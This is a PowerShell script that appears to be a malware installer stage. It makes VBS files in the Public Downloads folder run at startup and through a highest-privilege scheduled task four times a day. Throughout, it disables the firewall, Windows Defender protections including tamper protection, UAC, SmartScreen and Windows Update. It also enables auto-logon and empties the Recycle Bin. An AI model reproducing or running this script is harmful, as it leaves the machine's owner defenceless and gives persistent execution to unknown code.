Set-ExecutionPolicy Bypass -Scope Process -Force
$source = "C:\Users\Public\Downloads\Autorun.vbs"
$startupPath = [Environment]::GetFolderPath("Startup")
$destination = Join-Path $startupPath "Autorun.vbs.lnk"
if (Test-Path $source) {
    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($destination)
    $shortcut.TargetPath = $source
    $shortcut.WorkingDirectory = Split-Path $source
    $shortcut.WindowStyle = 1
    $shortcut.Save()
    Write-Host "shortcut: $destination"
} else {
    Write-Host "File $source DoesNotExist."
}

Stop-Service -Name "WSearch" -Force
Set-Service -Name "WSearch" -StartupType Disabled
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -SubmitSamplesConsent NeverSend
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' /v 'DisableRealtimeMonitoring' /t REG_DWORD /d '1' /f
reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f
reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications' /v 'ToastEnabled' /t REG_DWORD /d '0' /f


$services = @("wuauserv","UsoSvc","BITS","DoSvc","WaaSMedicSvc","SIHClient")
foreach ($svc in $services) {
    Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
    Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
}
Remove-Item -Path "C:\Windows\SoftwareDistribution\Download\*" -Recurse -Force -ErrorAction SilentlyContinue
$tasks = @(
    "\Microsoft\Windows\UpdateOrchestrator\Reboot",
    "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan",
    "\Microsoft\Windows\UpdateOrchestrator\UpdateModel",
    "\Microsoft\Windows\WindowsUpdate\Scheduled Start",
    "\Microsoft\Windows\WindowsUpdate\sih"
)
foreach ($task in $tasks) {
    try { schtasks /Delete /TN $task /F | Out-Null } catch {}
}
Remove-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Update" -Recurse -Force -ErrorAction SilentlyContinue
$pause = "2099-12-31T00:00:00Z"
$pause_start = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
$regPath = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "PauseUpdatesStartTime" -Value $pause_start
Set-ItemProperty -Path $regPath -Name "PauseUpdatesExpiryTime" -Value $pause
Set-ItemProperty -Path $regPath -Name "PauseFeatureUpdatesStartTime" -Value $pause_start
Set-ItemProperty -Path $regPath -Name "PauseFeatureUpdatesEndTime" -Value $pause
Set-ItemProperty -Path $regPath -Name "PauseQualityUpdatesStartTime" -Value $pause_start
Set-ItemProperty -Path $regPath -Name "PauseQualityUpdatesEndTime" -Value $pause
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "DisableWindowsUpdateAccess" -PropertyType DWORD -Value 1 -Force | Out-Null
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -PropertyType DWORD -Value 1 -Force | Out-Null
reg add "HKLM\SOFTWARE\Microsoft\WindowsSelfHost\UI\Visibility" /v "HideInsiderPage" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" /v "HideMCTLink" /t REG_DWORD /d 1 /f


Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '0'
Get-Process -Name "msedge" -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process | Where-Object { $_.ProcessName -like "msedgewebview2*" } | Stop-Process -Force -ErrorAction SilentlyContinue
reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value "1"
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Name "Enabled" -Type DWord -Value 0
set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "AllowDomainPINLogon" -Type DWord -Value 0

$taskName = "Run Setup.vbs Daily"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$setupPath`""
$trigger1 = New-ScheduledTaskTrigger -Daily -At 00:00AM
$trigger2 = New-ScheduledTaskTrigger -Daily -At 6:00AM
$trigger3 = New-ScheduledTaskTrigger -Daily -At 12:00PM
$trigger4 = New-ScheduledTaskTrigger -Daily -At 6:00PM
$principal = New-ScheduledTaskPrincipal -UserId "$env:UserName" -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2, $trigger3, $trigger4) -Principal $principal -Force

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
exit
